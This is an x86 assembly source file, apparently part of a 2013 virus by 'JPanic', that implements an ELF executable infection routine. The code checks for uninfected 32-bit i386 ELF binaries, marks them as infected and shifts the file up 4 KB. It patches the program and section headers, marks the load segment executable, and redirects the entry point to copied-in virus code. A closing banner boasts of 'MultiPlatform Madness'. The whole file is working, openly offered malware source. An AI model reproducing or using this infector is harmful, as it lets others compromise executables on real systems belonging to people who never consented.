;= ELF Infection Routine Definitions (c) 2013 JPanic =======================
;
; Provides routines for infection of ELF executables.
;
; PUBLICS:
;	InfectELF()
;
;= Directive Warez ========================================================

	.486
	.model flat
	locals @@

	include inc\elf.inc
        include vheap.ash
        include vmain.ash
        include osprocs.ash
        
;= Code Warez =============================================================
        include codeseg.ash
;= InfectELF ==============================================================
;
; Inputs:
;	EBX = Mapped file image.
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC InfectELF
InfectELF		PROC
			; Check EHDR
			cmp	dwo [ebx.e_ident+3],123h
			org	$-4
			; FileClass=ELFCLASS32, DataEncoding=ELFDATA2LSB,EI_Version=EV_CURRENT
			db	'F',01,01,01
			jne	@@jne_ret$0
			; Already INFECTED?
			cmp     wo [ebx.e_ident+EI_PAD+4],VMarker
			je	@@ret
			; Executable?
			cmp	wo [ebx.e_type],ET_EXEC
		@@jne_ret$0:
			jne	@@jne_ret$1
			; Correct structure sizes?
			cmp	wo [ebx.e_ehsize],size Elf32_Ehdr
		@@jne_ret$1:
			jne	@@jne_ret$2
			cmp	wo [ebx.e_phentsize],size Elf32_Phdr
		@@jne_ret$2:	
			jne	@@jne_ret$3
                        .errnz (size Elf32_Phdr - 20h) Elf32_Phdr not 20h bytes in InfectELF
			cmp	wo [ebx.e_shentsize],size Elf32_Shdr
		@@jne_ret$3:	
			jne	@@jne_ret$4
			cmp	[ebx.e_phoff],size Elf32_Ehdr
		@@jne_ret$4:
			jne	@@jne_ret$5
			;e_machine == 386 or 486
			movzx	eax,wo [ebx.e_machine]
			cmp	al,EM_386
			.if !ZERO?
				cmp al,EM_486
			  @@jne_ret$5:
				jne @@ret
			.endif
			movzx	ecx,wo [ebx.e_phnum]
			cmp	ecx,30
			ja	@@ret
			; Process EHDR
			xor	edx,edx
			mov	dh,10h			
			mov	wo [ebx.e_ident+EI_PAD+4],VMarker
			add	dwo [ebx.e_shoff],edx
			; Process PHDRS			
			mov	edi,[ebx.e_phoff]
                        add     edi,ebx
                        PHDR    equ  edi
		        @@phdr_loop:
				mov     eax,[PHDR.p_type]     
				cmp     al,PT_NULL
                                je      @@phdr_next
                                cmp     al,PT_PHDR
                                je      @@update_paddr_and_vaddr
                                cmp     al,PT_LOAD
                                jne     @@normal_phdr
                                cmp     [PHDR.p_offset],0
                                jne     @@normal_phdr
                                add	[PHDR.p_filesz],edx
			        add	[PHDR.p_memsz],edx			        
			        or	[PHDR.p_flags],5	; PF_X + PF_R
                                push    edi             ; save .text phdr position for later calculation of new EIP                                   
                        @@update_paddr_and_vaddr:
                                sub     [PHDR.p_vaddr],edx
                                sub     [PHDR.p_paddr],edx
                                jmp     @@phdr_next
                        @@normal_phdr:
                                add     [PHDR.p_offset],edx
                        @@phdr_next:
                        add     edi,size Elf32_Phdr
                        loop    @@phdr_loop
                        sub     edi,ebx
                        push    edi             ;edi = end of phdrs where we copy the virus
                        ; Move file up 4k
			mov	ecx,[vheap.dwFileSize]
			lea	esi,[ebx+ecx-1]
			lea	edi,[esi+edx]
			std
			rep	movsb
			cld                     
                        ; Fix SH table
			movzx	ecx,wo [ebx.e_shnum]			
			mov	edi,[ebx.e_shoff]                        
			@@sfixl:	add	[edi+ebx.sh_offset],edx
					add	edi,size Elf32_Shdr
					loop	@@sfixl
                        ; Adjust file - first set new size.			
			add	[vheap.dwFileSize],edx			
			; Set new EIP, Then copy virus			
			pop     edi     ; edi=buffer at end of phdrs
			pop     esi     ; esi=.text phdr entry
                        mov     eax,[esi.p_vaddr]
                        add     eax,edi
                        xchg    [ebx.e_entry],eax
                        add     edi,ebx
                        mov     dl,OS_Proc_Use_Linux                        
                        call    BuildVBody
		@@ret:	ret		
InfectELF		ENDP

;--------------------------------------------------------------------------
PUBLIC txt2
txt2	dw	(ofs txt2e - txt2s)
txt2s:	ASCII_VSIZE
	db	" bytes of (obsolete) MultiPlatform Madness!",0
txt2e:
;==========================================================================
                ENDS
		END
;==========================================================================
